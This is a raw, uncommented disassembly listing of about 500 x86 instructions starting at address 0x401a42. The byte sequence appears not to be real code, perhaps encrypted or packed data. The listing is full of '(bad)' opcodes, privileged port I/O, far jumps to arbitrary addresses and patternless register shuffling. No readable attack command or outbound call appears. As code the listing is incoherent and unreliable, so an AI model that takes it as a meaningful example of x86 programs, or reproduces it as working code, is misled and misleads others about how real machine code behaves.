  401a42:	(bad)  
  401a44:	cmp    BYTE PTR [ecx+0x60],cl
  401a47:	fwait
  401a48:	aaa    
  401a49:	jecxz  0x401a48
  401a4b:	mov    ah,0x4e
  401a4d:	xchg   DWORD PTR [eax-0x52],esi
  401a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a51:	cmp    al,0xe1
  401a53:	es add edi,ecx
  401a56:	sub    bh,cl
  401a58:	cmp    esi,DWORD PTR ds:0xcd554952
  401a5e:	pop    esi
  401a5f:	adc    esp,DWORD PTR [ebp+ebx*4-0x39cd576c]
  401a66:	enter  0x8e61,0x19
  401a6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a6b:	mov    BYTE PTR [edx+0x5b],ah
  401a6e:	jno    0x401a90
  401a70:	(bad)  [esi+0x6e]
  401a73:	cmp    al,BYTE PTR [edx-0x52768b6f]
  401a79:	lahf   
  401a7a:	xchg   esi,eax
  401a7b:	mov    DWORD PTR [edi+0x5b13d442],edi
  401a81:	les    edx,FWORD PTR [edx-0x3d]
  401a84:	fstp   TBYTE PTR [esi]
  401a86:	int    0xcb
  401a88:	adc    bl,bh
  401a8a:	and    ebx,0x25
  401a8d:	jno    0x401ab0
  401a8f:	adc    al,0xd
  401a91:	cs repnz test eax,0x88f13c1e
  401a98:	inc    ecx
  401a99:	mov    ebx,0x98243eb3
  401a9e:	add    al,0xe0
  401aa0:	add    bl,dh
  401aa2:	push   edi
  401aa3:	xor    DWORD PTR [ebx-0x36],esp
  401aa6:	inc    ebp
  401aa7:	clc    
  401aa8:	jle    0x401a2f
  401aaa:	sbb    ah,cl
  401aac:	mov    eax,0xb748815f
  401ab1:	push   ecx
  401ab2:	cmp    al,0xee
  401ab5:	les    eax,FWORD PTR [ebx]
  401ab7:	cmp    DWORD PTR [eax-0x1a],ebx
  401aba:	mov    al,ds:0x4b647f11
  401abf:	(bad)  
  401ac0:	push   ss
  401ac1:	in     eax,dx
  401ac2:	inc    BYTE PTR [eax]
  401ac4:	inc    ebx
  401ac5:	xlat   BYTE PTR ds:[ebx]
  401ac6:	call   0xc782774f
  401acb:	mov    ebp,0x258bef2
  401ad0:	xchg   ecx,eax
  401ad1:	adc    esp,DWORD PTR [ebx]
  401ad3:	mov    esp,0x3ba6aab7
  401ad8:	stc    
  401ad9:	jmp    0x401af7
  401adb:	cmp    eax,0xf4b0d892
  401ae0:	call   0xd966:0x6a953fe1
  401ae7:	or     bl,BYTE PTR [edi]
  401ae9:	fs jae 0x401b36
  401aec:	adc    DWORD PTR ds:0x1b090b81,0x7d4b5491
  401af6:	fild   DWORD PTR [edx+eiz*2]
  401af9:	add    BYTE PTR [edi],bl
  401afb:	(bad)  [ebx+0x8733653]
  401b01:	add    al,0x1
  401b03:	mov    edi,0xec5dafd0
  401b08:	data16 mov bh,0xd
  401b0b:	daa    
  401b0c:	inc    ecx
  401b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b0e:	int    0x42
  401b10:	cmp    DWORD PTR [ecx],edx
  401b12:	mov    edi,0x8efe0c92
  401b17:	shl    DWORD PTR [edx-0x171acaeb],0x98
  401b1e:	ins    DWORD PTR es:[edi],dx
  401b1f:	xor    BYTE PTR [esp+edx*2],al
  401b22:	es mov sp,fs
  401b26:	imul   eax,DWORD PTR [bp+si],0x31
  401b2a:	jg     0x401aca
  401b2c:	jno    0x401b35
  401b2e:	or     eax,0xbd72dc48
  401b33:	jne    0x401b0b
  401b35:	push   ebp
  401b36:	aad    0x17
  401b38:	cmc    
  401b39:	xchg   DWORD PTR [ebp+0x72],edx
  401b3c:	iret   
  401b3d:	lahf   
  401b3e:	mov    ah,0x54
  401b40:	xchg   ecx,eax
  401b41:	inc    eax
  401b42:	pop    ebp
  401b43:	lock scas eax,DWORD PTR es:[edi]
  401b45:	out    dx,al
  401b46:	mov    ds:0x5aace4c3,al
  401b4b:	retf   
  401b4c:	mov    bh,cl
  401b4e:	adc    dl,ah
  401b50:	jmp    0x401b60
  401b52:	sub    al,0xa9
  401b54:	jecxz  0x401b3c
  401b56:	rol    DWORD PTR [esi-0x28d4651d],1
  401b5c:	pop    ebx
  401b5d:	cmp    DWORD PTR [eax-0x3ebd6a44],edi
  401b63:	dec    eax
  401b64:	add    esi,DWORD PTR [eax+0x39]
  401b67:	inc    esi
  401b68:	ins    DWORD PTR es:[edi],dx
  401b69:	push   esi
  401b6a:	sub    al,0xbf
  401b6c:	add    al,0x5a
  401b6e:	jnp    0x401b34
  401b70:	int    0x40
  401b72:	stos   BYTE PTR es:[edi],al
  401b73:	jmp    0xa445:0x47bd71a5
  401b7a:	lock jnp 0x401b09
  401b7d:	mov    esi,0xd687b90d
  401b82:	push   es
  401b83:	pop    eax
  401b84:	pop    ds
  401b85:	loope  0x401b6b
  401b87:	push   ds
  401b88:	xor    al,0xe3
  401b8a:	in     eax,0x86
  401b8c:	retf   0x9321
  401b8f:	adc    edi,DWORD PTR [eax-0x6a]
  401b92:	push   ecx
  401b93:	call   FWORD PTR [edi+0x11]
  401b96:	call   0x7fa1fec8
  401b9b:	mov    bh,0xce
  401b9d:	dec    ebx
  401b9e:	xchg   esp,eax
  401b9f:	aam    0xdf
  401ba1:	call   0x50ef1af2
  401ba6:	fwait
  401ba7:	sbb    DWORD PTR [ecx+esi*8+0x366ec205],ebp
  401bae:	xchg   ecx,eax
  401baf:	neg    DWORD PTR [ebp-0x7c]
  401bb2:	mov    ecx,0xc3199b4
  401bb7:	xor    BYTE PTR [eax+0x25],0x89
  401bbb:	popa   
  401bbc:	jbe    0x401b7c
  401bbe:	lahf   
  401bbf:	dec    ebx
  401bc0:	cld    
  401bc1:	pop    esp
  401bc2:	jp     0x401bed
  401bc4:	addr16 shl ch,cl
  401bc7:	jmp    0x6436:0xb341086e
  401bce:	or     al,cl
  401bd0:	dec    edx
  401bd1:	packssdw mm1,QWORD PTR [esi+0x2f]
  401bd5:	(bad)  
  401bd6:	jmp    FWORD PTR [esp+eax*2-0x739ed424]
  401bdd:	sbb    cl,BYTE PTR [esi+0x3699adec]
  401be3:	stc    
  401be4:	in     al,dx
  401be5:	leave  
  401be6:	bound  ebp,QWORD PTR [eax+0x1312f4bb]
  401bec:	and    al,0x9c
  401bee:	cmp    cl,BYTE PTR [eax+0x23e485e7]
  401bf4:	mov    DWORD PTR [ebp-0x51e6cde6],eax
  401bfa:	pop    ebp
  401bfb:	sar    DWORD PTR [ebp-0x18dc5170],1
  401c01:	(bad)  
  401c02:	stos   BYTE PTR es:[edi],al
  401c03:	(bad)  
  401c05:	sub    al,BYTE PTR [edi+0x37]
  401c08:	inc    edx
  401c09:	xchg   DWORD PTR [ebx],edx
  401c0b:	cli    
  401c0c:	lods   al,BYTE PTR ds:[esi]
  401c0d:	push   edi
  401c0e:	jbe    0x401c1b
  401c10:	dec    eax
  401c11:	scas   al,BYTE PTR es:[edi]
  401c12:	pop    ds
  401c13:	pop    ebp
  401c14:	lds    edx,FWORD PTR [edx-0x2cc13a5e]
  401c1a:	test   ecx,esp
  401c1c:	cmp    BYTE PTR fs:[esi+0x707be0d7],cl
  401c23:	adc    al,0x37
  401c25:	jb     0x401c85
  401c27:	sbb    esp,0x191e6803
  401c2d:	add    ecx,ebp
  401c2f:	sub    ebp,esi
  401c31:	stos   BYTE PTR es:[edi],al
  401c32:	out    0x1e,al
  401c34:	xor    eax,0x17d24005
  401c39:	mov    ds:0xd761ef7a,al
  401c3e:	popa   
  401c3f:	dec    edx
  401c40:	fmul   DWORD PTR [edx+0x5882d10a]
  401c46:	ja     0x401c36
  401c48:	addr16 icebp 
  401c4a:	aad    0x5
  401c4c:	scas   eax,DWORD PTR es:[edi]
  401c4d:	or     ah,BYTE PTR [edx]
  401c4f:	sbb    esp,DWORD PTR [edi]
  401c51:	sbb    BYTE PTR [esi-0x4d],bl
  401c54:	ror    BYTE PTR [edi-0xc],cl
  401c57:	loopne 0x401c27
  401c59:	jno    0x401cc0
  401c5b:	mov    ebp,0xa130f78e
  401c60:	popf   
  401c61:	les    esi,FWORD PTR [ebx-0x5ce5224d]
  401c67:	push   cs
  401c68:	lds    eax,FWORD PTR [edi]
  401c6a:	hlt    
  401c6b:	mov    BYTE PTR [eax-0x17592174],dl
  401c71:	add    eax,0xae81e09f
  401c76:	pop    ebp
  401c77:	xor    esp,eax
  401c79:	add    cl,BYTE PTR [eax]
  401c7b:	sub    eax,0x49e29156
  401c80:	rcl    dh,1
  401c82:	push   0x331810d4
  401c87:	mov    edx,0x6d4a3533
  401c8c:	test   eax,0xcbb932c9
  401c91:	out    dx,eax
  401c92:	mov    ds:0x942f2fa1,al
  401c97:	push   ecx
  401c98:	push   ds
  401c99:	mov    bl,0x8b
  401c9b:	pop    eax
  401c9c:	or     ch,BYTE PTR [esi+0x3a]
  401c9f:	mov    ch,0x1e
  401ca1:	push   edx
  401ca2:	dec    edi
  401ca3:	into   
  401ca4:	or     al,al
  401ca6:	pop    eax
  401ca7:	out    0xc7,eax
  401ca9:	jbe    0x401c2c
  401cab:	inc    edx
  401cac:	out    dx,eax
  401cad:	pushf  
  401cae:	xor    DWORD PTR [esi+ebx*8-0x27],ecx
  401cb2:	outs   dx,DWORD PTR ds:[esi]
  401cb3:	xchg   edx,eax
  401cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cb5:	imul   BYTE PTR [eax+0x7f9a69e8]
  401cbb:	mov    al,ds:0xdc2c6cd5
  401cc0:	push   0xfffffff7
  401cc2:	sub    cl,BYTE PTR [ebx-0x4b]
  401cc5:	(bad)  
  401cc6:	test   eax,0x2a22803b
  401ccb:	mov    dl,0x3e
  401ccd:	fwait
  401cce:	jmp    0x748ae29b
  401cd3:	jbe    0x401d0b
  401cd5:	jmp    0x401d2c
  401cd7:	je     0x401ccc
  401cd9:	(bad)  
  401cda:	addr16 loope 0x401d04
  401cdd:	add    edi,DWORD PTR ds:0x7886c061
  401ce3:	mov    ds:0xc85ed81a,al
  401ce8:	mov    edi,0xf082f5fd
  401ced:	push   es
  401cee:	sub    eax,0x81002211
  401cf3:	or     al,0xba
  401cf5:	pop    ebx
  401cf6:	or     ch,dh
  401cf8:	mov    cl,BYTE PTR [edx+edx*1+0x4579db24]
  401cff:	push   ds
  401d00:	mov    ds,WORD PTR [edx+0x44798ee3]
  401d06:	jnp    0x401c99
  401d08:	xor    al,0x18
  401d0a:	inc    edx
  401d0b:	popa   
  401d0c:	mov    ch,0x5e
  401d0e:	ror    BYTE PTR [ebp+0x1db354ea],0x72
  401d15:	pop    ebx
  401d16:	std    
  401d17:	inc    ebp
  401d18:	mov    edx,DWORD PTR [edx-0x301dfee5]
  401d1e:	icebp  
  401d1f:	shl    DWORD PTR [ebx],1
  401d21:	int    0xda
  401d23:	sti    
  401d24:	test   DWORD PTR [esi+0x5c],edi
  401d27:	add    al,0x3c
  401d29:	cmp    DWORD PTR [esi+0x2b],ebp
  401d2c:	or     bl,BYTE PTR [ecx-0x76]
  401d2f:	enter  0xa00f,0x2d
  401d33:	test   al,0x36
  401d35:	mov    eax,ds:0x130552c1
  401d3a:	call   0x1f28df56
  401d3f:	mov    edi,0xaf428b8b
  401d44:	mov    al,ds:0xa7ff8aac
  401d49:	repnz push edx
  401d4b:	aaa    
  401d4c:	(bad)  
  401d4d:	fisubr WORD PTR [ecx+edi*2+0x3d]
  401d51:	or     al,0xe7
  401d53:	popa   
  401d54:	jl     0x401d42
  401d56:	int    0xf3
  401d58:	ins    BYTE PTR es:[edi],dx
  401d59:	sbb    edx,DWORD PTR [edx-0x26e833a8]
  401d5f:	cmp    bh,BYTE PTR [ebx+0x4547ef43]
  401d65:	cmp    ebp,DWORD PTR [ebx-0x20]
  401d68:	push   edi
  401d69:	mov    edi,0xffef4334
  401d6e:	or     esi,DWORD PTR [ebp+ebx*4-0x77]
  401d72:	fidivr DWORD PTR [edx+0x624bdbfb]
  401d78:	and    al,0x55
  401d7a:	inc    edx
  401d7b:	mov    bl,0x8a
  401d7d:	jb     0x401d64
  401d7f:	out    0x22,eax
  401d81:	pusha  
  401d82:	dec    ecx
  401d83:	xlat   BYTE PTR ds:[ebx]
  401d84:	and    dl,BYTE PTR [esi]
  401d86:	xor    eax,0x6a4cb72d
  401d8b:	sbb    BYTE PTR [ebp-0x2d],dl
  401d8e:	adc    cl,BYTE PTR [esi+0x60]
  401d91:	adc    eax,0x3aa4c1b0
  401d96:	xchg   esp,eax
  401d97:	ret    
  401d98:	and    BYTE PTR [eax+0x45],bl
  401d9b:	aas    
  401d9c:	in     al,dx
  401d9d:	fdivrp st(7),st
  401d9f:	cwde   
  401da0:	mov    ds:0x46d11d4d,eax
  401da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401da6:	stos   BYTE PTR es:[edi],al
  401da7:	ror    bl,cl
  401da9:	jb     0x401da2
  401dab:	outs   dx,DWORD PTR ds:[esi]
  401dac:	mov    ch,BYTE PTR [ebp+ecx*2-0x17]
  401db0:	ins    BYTE PTR es:[edi],dx
  401db1:	pushf  
  401db2:	add    eax,DWORD PTR [ebx+eax*8]
  401db5:	(bad)  
  401db6:	jae    0x401d98
  401db8:	xchg   esi,eax
  401db9:	ins    BYTE PTR es:[edi],dx
  401dba:	jmp    0x401d6b
  401dbc:	inc    esp
  401dbd:	(bad)  
  401dbe:	jmp    0xcced:0x5a8b5bbe
  401dc5:	fsub   QWORD PTR [edx-0x33e9988b]
  401dcb:	mov    ah,0xb2
  401dcd:	pop    eax
  401dce:	jecxz  0x401d50
  401dd0:	lods   al,BYTE PTR ds:[esi]
  401dd1:	lods   eax,DWORD PTR ds:[esi]
  401dd2:	lds    eax,FWORD PTR [edi+0x34660cd9]
  401dd8:	and    BYTE PTR [esi*2-0x3013667e],dl
  401ddf:	adc    ch,BYTE PTR [edi]
  401de1:	lock cdq 
  401de3:	jl     0x401da1
  401de5:	mov    ch,ch
  401de7:	inc    esp
  401de8:	mov    WORD PTR [edi+0x48],?
  401deb:	test   al,0xaa
  401ded:	xchg   edi,eax
  401dee:	jo     0x401ded
  401df0:	dec    edx
  401df1:	call   0x1476480b
  401df6:	test   DWORD PTR [ebp+edx*2-0x12],0xb1387f51
  401dfe:	mov    ebp,DWORD PTR [edi*1+0x7306f604]
  401e05:	or     al,ah
  401e07:	call   0x3dafa01d
  401e0c:	test   al,0x61
  401e0e:	add    BYTE PTR [ecx],ah
  401e10:	jle    0x401dfd
  401e12:	lock in eax,dx
  401e14:	and    DWORD PTR [edi-0x7ac8579e],0x28ccae58
  401e1e:	(bad)  
  401e1f:	mov    cl,0x4e
  401e21:	or     eax,0x80f07fd8
  401e26:	aas    
  401e27:	cmp    BYTE PTR [esp+eax*1],ch
  401e2a:	xchg   ecx,eax
  401e2b:	test   eax,0x5d979d1c
  401e30:	push   eax
  401e31:	cdq    
  401e32:	push   esi
  401e33:	jne    0x401e3d
  401e35:	push   eax
  401e36:	xchg   bh,ah
  401e38:	pop    esi
  401e39:	outs   dx,DWORD PTR ds:[esi]
  401e3a:	pop    esp
  401e3b:	test   ecx,ebp
  401e3d:	mov    ds:0x70f95ed8,eax
  401e42:	in     eax,dx
  401e43:	and    eax,0xa101895a
  401e48:	cmc    
  401e49:	aas    
  401e4a:	retf   0xd545
  401e4d:	pop    edx
  401e4e:	shl    BYTE PTR [esi+0x1],cl
  401e51:	sbb    WORD PTR [edx+0x32],si
  401e55:	ret    0xa44f
  401e58:	loop   0x401ed0
  401e5a:	pop    es
  401e5b:	test   eax,0x88b53f08
  401e60:	adc    dh,al
  401e62:	jo     0x401e02
  401e64:	call   DWORD PTR [edi-0x41]
  401e67:	stos   BYTE PTR es:[edi],al
  401e68:	cdq    
  401e69:	out    0xe6,al
  401e6b:	cwde   
  401e6c:	test   al,0x57
  401e6e:	aad    0x31
  401e70:	popa   
  401e71:	rep ins DWORD PTR es:[edi],dx
  401e73:	in     eax,0x58
  401e75:	fsub   QWORD PTR [ecx-0x54301bda]
  401e7b:	mov    esi,ecx
  401e7d:	mov    WORD PTR [ebx-0x27002095],cs
  401e83:	jge    0x401eb7
  401e85:	loope  0x401ebb
  401e87:	and    al,0xb1
  401e89:	adc    eax,0xd27575bf
  401e8e:	(bad)
  401e91:	fst    DWORD PTR [ecx+ebp*8-0x4d]
  401e95:	popa   
  401e96:	(bad)  
  401e97:	dec    edi
  401e98:	or     eax,0x8906ee26
  401e9d:	fadd   DWORD PTR [edi+eax*1]
  401ea0:	imul   edx,DWORD PTR [ecx],0xffffffc2
  401ea3:	push   esp
  401ea4:	xchg   bl,bh
  401ea6:	xor    al,0xb7
  401ea8:	jo     0x401e91
  401eaa:	xchg   edx,esp
  401eac:	mov    eax,0x64acae67
  401eb1:	jmp    0xcaf1:0x366c0c79
  401eb8:	mov    al,0xc0
  401eba:	xlat   BYTE PTR ds:[ebx]
  401ebb:	sub    bl,BYTE PTR [edi-0x6a]
  401ebe:	adc    ebp,ebx
  401ec0:	test   al,0x16
  401ec2:	cmp    DWORD PTR [ebx+0x55],ebx
  401ec5:	ret    
  401ec6:	int    0xb1
  401ec8:	mov    ch,0xd2
  401eca:	std    
  401ecb:	push   eax
  401ecc:	js     0x401ebd
  401ece:	mov    ah,0x4d
  401ed0:	imul   edx,DWORD PTR [ebx+eax*1+0x129bfdc7],0x6e
  401ed8:	adc    eax,0xa8132995
  401edd:	data16 ja 0x401f1e
  401ee0:	push   cs
  401ee1:	rcr    edi,0x8c
  401ee4:	xor    ch,BYTE PTR [edi]
  401ee6:	jle    0x401ee6
  401ee8:	test   edx,edi
  401eea:	mov    al,0x7f
  401eec:	jge    0x401e82
  401eee:	fst    QWORD PTR [ebx-0x35890495]
  401ef4:	outs   dx,BYTE PTR ds:[esi]
  401ef5:	int    0xbf
  401ef7:	or     al,0x56
  401ef9:	xchg   edx,eax
  401efa:	das    
  401efb:	mov    esp,DWORD PTR [edx+0x4f]
  401efe:	mov    esi,0x579c3871
  401f03:	lds    ebx,FWORD PTR [ecx-0x1a60f60b]
  401f09:	xor    dh,0xb5
  401f0c:	sbb    al,0x8f
  401f0e:	mov    ebx,0x1c0c09b4
  401f13:	pop    ecx
  401f14:	adc    eax,0x3d3aa949
  401f19:	jo     0x401ea2
  401f1b:	jmp    DWORD PTR [ebx]
  401f1d:	lods   al,BYTE PTR ds:[esi]
  401f1e:	add    ebp,edi
  401f20:	lahf   
  401f21:	push   ss
  401f22:	fdivr  QWORD PTR [edi+0x4c]
  401f25:	imul   edi,DWORD PTR [eax+0x19f0361f],0x82d29661
  401f2f:	mov    edx,0xfc6fffe
  401f34:	or     cl,BYTE PTR [edi+ecx*2-0x3b]
  401f38:	cmp    BYTE PTR [ecx+edx*1-0x19],cl
  401f3c:	mov    DWORD PTR [esi+0xb],esp
  401f3f:	shl    BYTE PTR [edx+0x35],cl
  401f42:	(bad)
  401f45:	mov    BYTE PTR [edi-0x20],cl
  401f48:	hlt    
  401f49:	cmp    edi,DWORD PTR [esi]
  401f4b:	shr    DWORD PTR [ebp-0x5d],0x83
  401f4f:	cmp    eax,eax
  401f51:	mov    ds:0xaa86e969,eax
  401f56:	test   eax,0xfaf5be16
  401f5b:	daa    
  401f5c:	inc    esi
  401f5d:	xchg   ebx,eax
  401f5e:	pop    ebp
  401f5f:	fcomp  QWORD PTR [ebx+0x2d]
  401f62:	xor    BYTE PTR [ecx+0x1a5043c0],bh
  401f68:	pop    eax
  401f69:	nop
  401f6a:	fisub  WORD PTR [esp+esi*2+0xcf7e28b]
  401f71:	es push ebp
  401f73:	add    bh,cl
  401f75:	xor    BYTE PTR [ecx+0x49198752],cl
  401f7b:	and    eax,0x8c4c7b60
  401f80:	addr16 xor al,0x42
  401f83:	in     al,0x8c
  401f85:	sub    eax,0xebe6851f
  401f8a:	pusha  
  401f8b:	shr    DWORD PTR ds:0xa02d512e,cl
  401f91:	pop    edi
  401f92:	cmp    ebx,DWORD PTR [ebx]
  401f94:	push   edi
  401f95:	lods   eax,DWORD PTR ds:[esi]
  401f96:	dec    edi
  401f97:	dec    ebp
  401f98:	add    al,0xc9
  401f9a:	and    eax,0x1af442fe
  401f9f:	pop    ebp
  401fa0:	cmp    BYTE PTR [esi+edi*4+0x2d],cl
  401fa4:	out    0x24,eax
  401fa6:	xchg   cl,bl
  401fa8:	sahf   
  401fa9:	ins    DWORD PTR es:[edi],dx
  401faa:	pop    es
  401fab:	shr    DWORD PTR [esi-0x2c],0x25
  401faf:	test   eax,0x6213c540
  401fb4:	mov    edi,0x9fe7bf99
  401fb9:	xchg   esi,eax
  401fba:	push   edx
  401fbb:	pop    ebp
  401fbc:	mov    bl,BYTE PTR [esi]
  401fbe:	inc    esp
  401fbf:	jmp    0xda8c:0x45a6c5d9
  401fc6:	xchg   ebp,eax
  401fc7:	push   edx
  401fc8:	mov    esp,esp
  401fca:	xchg   edx,eax
  401fcb:	sti    
  401fcc:	(bad)  
  401fce:	clc    
  401fcf:	dec    esp
  401fd0:	(bad)  
  401fd3:	push   es
  401fd4:	js     0x401f97
  401fd6:	jmp    0x5358b4d1
  401fdb:	jle    0x401fc6
  401fdd:	leave  
  401fde:	dec    eax
  401fdf:	dec    ebp
  401fe0:	mov    eax,0x7fae054b
  401fe5:	sbb    eax,0xd5348f2f
  401fea:	dec    eax
  401feb:	ins    DWORD PTR es:[edi],dx
  401fec:	es jecxz 0x401f80
  401fef:	mov    bl,BYTE PTR [edi-0x2a61b01f]
  401ff5:	adc    cl,BYTE PTR [ebx+0x24]
  401ff8:	imul   edx,DWORD PTR [ebx],0x15
  401ffb:	inc    esi
  401ffc:	inc    esp
  401ffd:	scas   al,BYTE PTR es:[edi]
  401ffe:	pop    ss
  401fff:	fprem1 
  402001:	clc    
  402002:	test   eax,0xae9a73d8
  402007:	stc    
  402008:	imul   ebp,DWORD PTR [ebp-0xb],0xffffffe0
  40200c:	sbb    eax,0x9f09be28
  402011:	pop    es
  402012:	mov    ch,0x2c
  402014:	and    bh,BYTE PTR [ebx-0x5d1402d3]
  40201a:	ret    0xaa07
  40201d:	jge    0x40209a
  40201f:	imul   DWORD PTR [edx+0x4a179108]
  402025:	retf   0x8d80
  402028:	push   edx
  402029:	test   dh,cl
  40202b:	sti    
  40202c:	inc    edx
  40202d:	ret    0xe888
  402030:	fdivr  st(2),st
  402032:	fstp   QWORD PTR [ecx+ecx*2+0x64]
  402036:	jge    0x401fe5
  402038:	outs   dx,DWORD PTR ds:[esi]
  402039:	sub    BYTE PTR [ebp+0x7c],0x0
  40203d:	shl    edi,cl
  40203f:	sub    eax,0x71653a67
  402044:	cdq    
  402045:	push   ebp
  402046:	int    0xe5
  402048:	xchg   ebp,eax
  402049:	gs xchg esi,eax
  40204b:	mov    edi,0x75a31e3
  402050:	aaa    
  402051:	sbb    eax,0x138d1eff
  402056:	popf   
  402057:	mov    esp,0x714b57d4
  40205c:	fwait
  40205d:	or     dl,BYTE PTR [esi-0x54]
  402060:	sbb    BYTE PTR [edi-0x452b36b2],bl
  402066:	je     0x401ff7
  402068:	aaa    
  402069:	xchg   DWORD PTR [ebp+0x38],esi
  40206c:	inc    eax
  40206d:	stos   DWORD PTR es:[edi],eax
  40206e:	or     bh,BYTE PTR [ebp-0x9]
  402071:	ins    DWORD PTR es:[edi],dx
  402072:	addr16 jge 0x40202c
  402075:	mov    fs,ebx
  402077:	fistp  DWORD PTR [edx]
  402079:	jno    0x40205e
  40207b:	dec    eax
  40207c:	icebp  
  40207d:	cmp    al,ch
  40207f:	inc    edx
  402080:	lahf   
  402081:	pop    ss
  402082:	or     BYTE PTR [ebp-0x413902dc],cl
  402088:	scas   eax,DWORD PTR es:[edi]
  402089:	sub    bl,BYTE PTR [edi+0x2d815408]
  40208f:	push   edi
  402090:	add    eax,0xb12a17a6
  402095:	sub    eax,0xc47f3cc
  40209a:	xchg   ecx,eax
  40209b:	mov    WORD PTR [eax],gs
  40209d:	push   DWORD PTR [eax+0x61]
  4020a0:	dec    ecx
  4020a1:	or     DWORD PTR [eax+0x4f],eax
  4020a4:	dec    ebp
  4020a5:	cmp    BYTE PTR [eax-0x45],dl
  4020a8:	mov    al,0xa0
  4020aa:	jecxz  0x402042
  4020ac:	cmp    bl,BYTE PTR ds:0x72e1ce64
  4020b2:	lahf   
  4020b3:	nop
  4020b4:	aad    0x22
  4020b6:	data16 stc 
  4020b8:	jnp    0x4020e1
  4020ba:	or     bl,BYTE PTR gs:[eax]
  4020bd:	dec    ecx
  4020be:	mov    eax,ds:0x1db3667b
  4020c3:	psrlw  mm5,QWORD PTR [edx-0x6cf3c84c]
  4020ca:	mov    ebp,0xaad1fd1
  4020cf:	test   DWORD PTR [ebp-0x19fb1f34],esi
  4020d5:	data16 fild WORD PTR [edx+0x3734c788]
  4020dc:	sahf   
  4020dd:	jmp    0xbdf4:0x2223a5cd
  4020e4:	xlat   BYTE PTR ds:[ebx]
  4020e5:	jle    0x4020d4
  4020e7:	push   esi
  4020e8:	pop    ecx
  4020e9:	outs   dx,BYTE PTR ds:[esi]
  4020ea:	dec    ebp
  4020eb:	sub    BYTE PTR [edx],dh
  4020ed:	inc    esi
  4020ee:	cmp    ah,BYTE PTR [ebp-0x163a25c9]
  4020f4:	mov    DWORD PTR [ecx-0x6492b97c],0x89d1160c
  4020fe:	call   0x3a7dd96d
  402103:	mov    esp,0xb471b633
  402108:	add    bl,ch
  40210a:	and    eax,0xcc1dfba
  40210f:	repnz out dx,eax
  402111:	add    DWORD PTR [edx],edi
  402113:	sub    ebp,DWORD PTR [ecx-0x63]
  402116:	push   edx
  402117:	push   ss
  402118:	inc    eax
  402119:	or     bh,BYTE PTR [ebp-0x1e]
  40211c:	fucomip st,st(7)
  40211e:	inc    esp
  40211f:	xchg   DWORD PTR [esi+0x639e3e10],eax
  402125:	gs push esi
  402127:	xchg   ebp,eax
  402128:	mov    ds:0x87c038d6,eax
  40212d:	sub    ah,dl
  40212f:	fdiv   QWORD PTR ds:0xcf9252d0
  402135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402136:	xor    eax,0x3799ac5a
  40213b:	jl     0x40212f
  40213d:	dec    ebp
  40213e:	arpl   WORD PTR [ecx-0x57540246],bx
  402144:	or     BYTE PTR [ebp+0x4a],ch
  402147:	add    eax,0x18f59fc7
  40214c:	cmp    al,0x7
  40214e:	ins    BYTE PTR es:[edi],dx
  40214f:	(bad)  [ecx-0x190514d9]
  402155:	out    dx,eax
  402156:	mov    edx,0xe24b1ade
  40215b:	retf   
  40215c:	push   esp
  40215d:	retf   0xcd5e
  402160:	dec    ecx
  402161:	mov    al,ds:0x9fffc91e
  402166:	mov    esp,0x730314eb
  40216b:	jbe    0x4021ab
  40216d:	inc    ebp
  40216e:	outs   dx,DWORD PTR ds:[esi]
  40216f:	shl    edi,1
  402171:	fucomi st,st(4)
  402173:	fidiv  WORD PTR [eax]
  402175:	cmc    
  402176:	mov    bl,0x47
  402178:	ins    DWORD PTR es:[edi],dx
  402179:	loop   0x4021e1
  40217b:	(bad)  
  40217c:	(bad)  
  40217d:	mov    dl,0x79
  40217f:	sbb    DWORD PTR [esi-0x59c409b8],0x3d
  402186:	or     edi,DWORD PTR [esi-0x78]
  402189:	mov    esi,0xf56f8a0a
  40218e:	repnz push eax
  402190:	(bad)  
  402191:	sbb    ebx,DWORD PTR [esi-0x6f]
  402194:	mov    dh,0xed
  402196:	cs jecxz 0x402145
  402199:	sbb    al,BYTE PTR [eax]
  40219b:	jecxz  0x40217c
  40219d:	repnz gs fs stc 
  4021a1:	fcmovb st,st(5)
  4021a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021a4:	in     al,dx
  4021a5:	popa   
  4021a6:	icebp  
  4021a7:	add    eax,0x259a7ec0
  4021ac:	xor    DWORD PTR [edx-0x9],edi
  4021af:	fwait
  4021b0:	call   0x4e97a5bc
  4021b5:	stos   BYTE PTR es:[edi],al
  4021b6:	call   0x1d893cc0
  4021bb:	test   eax,0xdbe26d84
  4021c0:	js     0x402163
  4021c2:	mov    ah,0x3b
  4021c4:	call   0xd5bb:0x6e5f09c0
  4021cb:	aad    0x9c
  4021cd:	adc    BYTE PTR [ecx+ebp*2+0x4cfde651],0x34
  4021d5:	adc    al,0xd9
  4021d7:	xchg   edx,ecx
  4021d9:	xor    DWORD PTR [ebx+0x3b12d0a8],0xabf00db5
  4021e3:	add    al,0x59
  4021e5:	scas   al,BYTE PTR es:[edi]
  4021e6:	test   DWORD PTR [ecx+0x9],ebx
  4021e9:	fcmove st,st(3)
  4021eb:	mov    edx,0x7963f9b3
  4021f0:	sbb    bl,bh
  4021f2:	frstor [ebp-0x1f69cfb7]
  4021f8:	jecxz  0x4021fe
  4021fa:	iret   
  4021fb:	loope  0x4021e5
  4021fd:	xchg   BYTE PTR [eax],ah
  4021ff:	lods   al,BYTE PTR ds:[esi]
  402200:	mov    ecx,0xaa590c4a
  402205:	adc    DWORD PTR [edi+0x6d],esp
  402208:	cmp    ebp,DWORD PTR [esp+edx*2-0x2dd11131]
  40220f:	pushf  
  402210:	out    0x38,eax
  402212:	jo     0x40224c
  402214:	cld    
  402215:	dec    DWORD PTR [esi+0x3f62f230]
  40221b:	fwait
  40221c:	scas   eax,DWORD PTR es:[edi]
  40221d:	lods   eax,DWORD PTR ds:[esi]
  40221e:	dec    ebx
  40221f:	mov    ebx,0x3cdd0bf
  402224:	shl    BYTE PTR [esi+ebp*4],cl
  402227:	daa    
  402228:	mov    WORD PTR [ebx-0x1],es
  40222b:	bound  edi,QWORD PTR [eax]
  40222d:	xlat   BYTE PTR ds:[ebx]
  40222e:	dec    edi
  40222f:	daa    
  402230:	ja     0x402277
  402232:	sahf   
  402233:	mov    ds:0x24cf5d63,eax
  402238:	jno    0x402245
